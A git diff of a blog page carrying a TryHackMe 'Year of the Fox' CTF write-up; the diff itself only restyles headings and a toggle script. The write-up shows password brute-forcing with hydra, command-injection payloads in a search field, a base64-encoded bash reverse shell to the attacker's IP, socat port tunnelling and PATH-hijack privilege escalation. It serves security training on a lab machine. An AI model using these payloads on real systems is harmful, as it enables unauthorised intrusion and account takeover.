@@ -31,19 +31,19 @@
       </table>
     </div>
     <div class="body">
-          <h1>[TryHackMe] Year of the Fox</h1>
+          <h1 class="h1 collapsible" onclick="toggle(this);">[TryHackMe] Year of the Fox</h1>
                   <p><a href="/posts/20200625_htb-bashed.html"> « </a>📅 published on <code>30/Jul/2020</code><a href="/posts/20200810_vulnhub-infosecpreposcp.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for TryHackMe VM <a href="https://tryhackme.com/room/yotf">Year of the Fox</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p><img alt="writeup.overview.machinescli" src="/static/files/posts_thm_yotf/machinescli.png.webp" /></p>
-<h3>Killchain</h3>
-<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_thm_yotf/killchain.png.webp" /></p>
-<h3>TTPs</h3>
-<p>1. <code>80/tcp/http/Apache httpd 2.4.29</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_command_injection">exploit_command_injection</a>, <a href="https://github.com/7h3rAm/writeups#privesc_env_relative_path">privesc_env_relative_path</a>  </p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.80 scan initiated Wed Jul 29 19:54:07 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/xml/_quick_tcp_nmap.xml 10.10.41.240
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for TryHackMe VM <a href="https://tryhackme.com/room/yotf">Year of the Fox</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_thm_yotf/machinescli.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
+<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_thm_yotf/killchain.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
+<p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.29</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_command_injection">exploit_command_injection</a>, <a href="https://github.com/7h3rAm/writeups#privesc_env_relative_path">privesc_env_relative_path</a>  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<pre class="nested"><code># Nmap 7.80 scan initiated Wed Jul 29 19:54:07 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/xml/_quick_tcp_nmap.xml 10.10.41.240
 Increasing send delay for 10.10.41.240 from 0 to 5 due to 25 out of 82 dropped probes since last increase.
 Nmap scan report for 10.10.41.240
 Host is up, received user-set (0.21s latency).
@@ -106,11 +106,11 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jul 29 19:55:04 2020 -- 1 IP address (1 host up) scanned in 56.96 seconds
 </code></pre>
-<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_thm_yotf/openports.png.webp" />  </p>
-<p>3. We find <code>80/tcp</code> to be open and enumerate it further. The webapp enforces authentication due to which we are not allowed to view any pages. We will need to find the credentials for the web app to proceed with this further:  </p>
-<p>4. From the scan results SMB for ports, we find that there are two active users on this machine: <code>fox</code> and <code>rascal</code>  </p>
-<pre><code>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+<p class="nested">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_thm_yotf/openports.png.webp" />  </p>
+<p class="nested">3. We find <code>80/tcp</code> to be open and enumerate it further. The webapp enforces authentication due to which we are not allowed to view any pages. We will need to find the credentials for the web app to proceed with this further:  </p>
+<p class="nested">4. From the scan results SMB for ports, we find that there are two active users on this machine: <code>fox</code> and <code>rascal</code>  </p>
+<pre class="nested"><code>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User\fox (Local User)
   User Name   : fox
   Full Name   : fox
@@ -129,17 +129,17 @@ No printers returned.
 
 enum4linux complete on Wed Jul 29 20:18:34 2020
 </code></pre>
-<p>5. We run a password bruteforce scan against the webapp for both usernames and find a hit:  </p>
-<pre><code>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.41.240 http-head /
+<p class="nested">5. We run a password bruteforce scan against the webapp for both usernames and find a hit:  </p>
+<pre class="nested"><code>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.41.240 http-head /
 </code></pre>
-<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_thm_yotf/screenshot01.png.webp" />  </p>
-<p>6. Upon logging in, we see a webpage with a search text box try out a few queries. Submitting an empty string shows a listing of 3 files. We setup Burp proxy and start enumerating the search functionality further:  </p>
-<p><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_thm_yotf/screenshot02.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_thm_yotf/screenshot03.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.6.3" src="/static/files/posts_thm_yotf/screenshot04.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.6.4" src="/static/files/posts_thm_yotf/screenshot05.png.webp" />  </p>
-<p>7. We find a way to escape the search input and get command execution on the target machine:  </p>
-<pre><code>POST /assets/php/search.php HTTP/1.1
+<p class="nested"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_thm_yotf/screenshot01.png.webp" />  </p>
+<p class="nested">6. Upon logging in, we see a webpage with a search text box try out a few queries. Submitting an empty string shows a listing of 3 files. We setup Burp proxy and start enumerating the search functionality further:  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_thm_yotf/screenshot02.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_thm_yotf/screenshot03.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.6.3" src="/static/files/posts_thm_yotf/screenshot04.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.6.4" src="/static/files/posts_thm_yotf/screenshot05.png.webp" />  </p>
+<p class="nested">7. We find a way to escape the search input and get command execution on the target machine:  </p>
+<pre class="nested"><code>POST /assets/php/search.php HTTP/1.1
   Host: 10.10.41.240
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
   Accept: */*
@@ -153,9 +153,9 @@ enum4linux complete on Wed Jul 29 20:18:34 2020
 
   {&quot;target&quot;:&quot;\&quot;;whoami\n&quot;}
 </code></pre>
-<p><img alt="writeup.enumeration.steps.7.1" src="/static/files/posts_thm_yotf/screenshot06.png.webp" />  </p>
-<p>8. We use this to triage the file system and find the first web flag file:  </p>
-<pre><code>POST /assets/php/search.php HTTP/1.1
+<p class="nested"><img alt="writeup.enumeration.steps.7.1" src="/static/files/posts_thm_yotf/screenshot06.png.webp" />  </p>
+<p class="nested">8. We use this to triage the file system and find the first web flag file:  </p>
+<pre class="nested"><code>POST /assets/php/search.php HTTP/1.1
   Host: 10.10.41.240
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
   Accept: */*
@@ -169,20 +169,20 @@ enum4linux complete on Wed Jul 29 20:18:34 2020
 
   {&quot;target&quot;:&quot;\&quot;cat ../../../web-flag.txt;\n&quot;}
 </code></pre>
-<p><img alt="writeup.enumeration.steps.8.1" src="/static/files/posts_thm_yotf/screenshot07.png.webp" />  </p>
-<h3>Findings</h3>
-<h4>Open Ports</h4>
-<pre><code>80/tcp    http          Apache httpd 2.4.29
+<p class="nested"><img alt="writeup.enumeration.steps.8.1" src="/static/files/posts_thm_yotf/screenshot07.png.webp" />  </p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>80/tcp    http          Apache httpd 2.4.29
 139/tcp   netbios-ssn   Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
 445/tcp   netbios-ssn   Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
 </code></pre>
-<h4>Users</h4>
-<pre><code>ssh: rascal, fox
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>ssh: rascal, fox
 webapp: rascal
 </code></pre>
-<h2>Phase #2: Exploitation</h2>
-<p>1. We further leverage the command execution vulnerability to get interactive access on the target machine. For this, we first start a local netcat listener and use a bash reverse shell:  </p>
-<pre><code>nc -nlvp 4433
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. We further leverage the command execution vulnerability to get interactive access on the target machine. For this, we first start a local netcat listener and use a bash reverse shell:  </p>
+<pre class="nested"><code>nc -nlvp 4433
 
 POST /assets/php/search.php HTTP/1.1
   Host: 10.10.41.240
@@ -198,22 +198,22 @@ POST /assets/php/search.php HTTP/1.1
 
   {&quot;target&quot;:&quot;\&quot;;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI2LjE4OS80NDMzIDA+JjE=' | base64 -d | bash \n&quot;}
 </code></pre>
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_thm_yotf/screenshot08.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_thm_yotf/screenshot08a.png.webp" />  </p>
-<p>2. We get a shell with <code>www-data</code> privileges and use it to probe further. From the listing of open ports, we find that the ssh port <code>22/tcp</code> is open and accepting connection only on the localhost interface. We can use <code>socat</code> to tunnel this port to probe it from our attacking system:  </p>
-<pre><code>socat tcp-listen:1337,reuseaddr,fork tcp:localhost:22
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_thm_yotf/screenshot08.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_thm_yotf/screenshot08a.png.webp" />  </p>
+<p class="nested">2. We get a shell with <code>www-data</code> privileges and use it to probe further. From the listing of open ports, we find that the ssh port <code>22/tcp</code> is open and accepting connection only on the localhost interface. We can use <code>socat</code> to tunnel this port to probe it from our attacking system:  </p>
+<pre class="nested"><code>socat tcp-listen:1337,reuseaddr,fork tcp:localhost:22
 </code></pre>
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_thm_yotf/screenshot09.png.webp" />  </p>
-<p>3. With this, we now have tunneled <code>localhost:22</code> to <code>10.10.41.240:1337</code> and can now run a ssh password bruteforce for user <code>fox</code> on it. After a few minutes we find a hit and can now login:  </p>
-<pre><code>hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.41.240:1337
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_thm_yotf/screenshot09.png.webp" />  </p>
+<p class="nested">3. With this, we now have tunneled <code>localhost:22</code> to <code>10.10.41.240:1337</code> and can now run a ssh password bruteforce for user <code>fox</code> on it. After a few minutes we find a hit and can now login:  </p>
+<pre class="nested"><code>hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.41.240:1337
 ssh fox@10.10.41.240 -p1337
 </code></pre>
-<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_thm_yotf/screenshot10.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_thm_yotf/screenshot11.png.webp" />  </p>
-<p>4. We find the second flag file <code>/home/fox/user-flag.txt</code>:  </p>
-<p><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_thm_yotf/screenshot12.png.webp" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>www-data@year-of-the-fox&gt; id
+<p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_thm_yotf/screenshot10.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_thm_yotf/screenshot11.png.webp" />  </p>
+<p class="nested">4. We find the second flag file <code>/home/fox/user-flag.txt</code>:  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_thm_yotf/screenshot12.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<pre class="nested"><code>www-data@year-of-the-fox&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@year-of-the-fox&gt;  
 www-data@year-of-the-fox&gt; uname
@@ -243,40 +243,40 @@ rascal
 fox
 root
 </code></pre>
-<h2>Phase #3: Privilege Escalation</h2>
-<p>1. We find that we can execute the <code>/usr/sbin/shutdown</code> file with <code>sudo</code>. Since the target machine doesn't have <code>strings</code> installed, we transfer this file to our attacking machine and investigate further. We find a reference to the <code>poweroff</code> binary name, which when combined with the fact that <code>secure_path</code> is not defined within <code>/etc/sudoers</code> (seen in <code>sudo -l</code> output), hint that a environment path modification vector could help us escalate privileges:  </p>
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_thm_yotf/screenshot13.png.webp" />  </p>
-<p>2. We copy bash to the local directory, rename it to <code>poweroff</code> and modify the <code>PATH</code> environment variable to search for file within current directory first. With this change, we then execute <code>shutdown</code> file and get elevated privileges:  </p>
-<pre><code>cp /bin/bash ./
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested">1. We find that we can execute the <code>/usr/sbin/shutdown</code> file with <code>sudo</code>. Since the target machine doesn't have <code>strings</code> installed, we transfer this file to our attacking machine and investigate further. We find a reference to the <code>poweroff</code> binary name, which when combined with the fact that <code>secure_path</code> is not defined within <code>/etc/sudoers</code> (seen in <code>sudo -l</code> output), hint that a environment path modification vector could help us escalate privileges:  </p>
+<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_thm_yotf/screenshot13.png.webp" />  </p>
+<p class="nested">2. We copy bash to the local directory, rename it to <code>poweroff</code> and modify the <code>PATH</code> environment variable to search for file within current directory first. With this change, we then execute <code>shutdown</code> file and get elevated privileges:  </p>
+<pre class="nested"><code>cp /bin/bash ./
 mv ./bash poweroff
 ls -la poweroff /bin/bash
 md5sum poweroff /bin/bash
 sudo /usr/sbin/shutdown
 </code></pre>
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_thm_yotf/screenshot14.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_thm_yotf/screenshot15.png.webp" />  </p>
-<p>3. We see the third flag file <code>root.txt</code> but it turns out to be placeholder. After some searching, we find the actual root flag file <code>.did-you-think-I-was-useless.root</code>, hidden within user <code>rascal</code>'s home directory:  </p>
-<pre><code>cat /home/rascal/.did-you-think-I-was-useless.root
+<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_thm_yotf/screenshot14.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_thm_yotf/screenshot15.png.webp" />  </p>
+<p class="nested">3. We see the third flag file <code>root.txt</code> but it turns out to be placeholder. After some searching, we find the actual root flag file <code>.did-you-think-I-was-useless.root</code>, hidden within user <code>rascal</code>'s home directory:  </p>
+<pre class="nested"><code>cat /home/rascal/.did-you-think-I-was-useless.root
 </code></pre>
-<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_thm_yotf/screenshot16.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_thm_yotf/screenshot17.png.webp" />  </p>
-<h2>Learning/Recommendation</h2>
-<ul>
+<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_thm_yotf/screenshot16.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_thm_yotf/screenshot17.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
+<ul class="nested">
 <li>The webapp exposed a search field which was vulnerable to command injection. This allowed the attacker to gain interactive access of the target machine. It is advised to follow a secure development lifecycle for critical production web applications.</li>
 <li>The <code>shutdown</code> binary was vulnerable to a path expansion attack which allowed the attacker to gain elevated privileges.</li>
 </ul>
-<h2>Loot</h2>
-<h3>Credentials</h3>
-<pre><code>ssh: fox/1234...
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<pre class="nested"><code>ssh: fox/1234...
 webapp: rascal/l...
 </code></pre>
-<h3>Flags</h3>
-<pre><code>/var/www/web-flag.txt: THM{Nzg2ZWQwYWUwN2UwOTU3N............
+<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
+<pre class="nested"><code>/var/www/web-flag.txt: THM{Nzg2ZWQwYWUwN2UwOTU3N............
 /home/fox/user-flag.txt: THM{Njg3NWZhNDBjMmNlMzNkM............
 /home/rascal/.did-you-think-I-was-useless.root: THM{ODM3NTdkMDljYmM4.................
 </code></pre>
-<h2>References</h2>
-<ul>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
 <li><a href="https://tryhackme.com/room/yotf">https://tryhackme.com/room/yotf</a>  </li>
 <li><a href="https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/">https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/</a>  </li>
 <li><a href="https://www.cybergoat.co.uk/writeup/Year-of-Fox-TryHackMe/">https://www.cybergoat.co.uk/writeup/Year-of-Fox-TryHackMe/</a>  </li>
@@ -287,19 +287,12 @@ webapp: rascal/l...
             </div>
     <div class="footer footercenter">
       <span>
-        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
       </span>
     </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(s){
-        s.classList.toggle("expanded");
-        for(var l=s.nextElementSibling;l;){
-          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-        }
-      }
-    </script>
+    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
     <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
   </body>
 </html>
